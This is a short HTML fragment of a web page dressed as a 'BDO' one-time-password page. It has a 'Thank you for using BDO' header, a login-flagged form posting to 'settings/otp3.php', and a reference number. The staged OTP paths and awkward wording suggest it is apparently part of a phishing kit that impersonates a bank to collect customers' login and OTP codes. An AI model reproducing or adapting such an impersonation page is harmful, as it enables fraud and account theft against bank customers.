...
<div id="parentcontainer">
			...
			<div id="mainwrapper" class="ui-corner-all otppage">
				<div id="main" class="contentblock">
					<table>
						<tbody><tr>
							<td>
								<h2 class="pageHeader"><span>Thank you for using BDO</span></h2>
	...
	<form autocomplete="off" loginform="true" id="id2f" method="post" action="settings/otp3.php">
			<div id="id32">
								...
								<label class="standardfont formlabel">You will get an email to us.</label><br><br>
								<label class="standardfont formlabel">For inquiries, your Reference Number is 03834471.</label>
								<br>
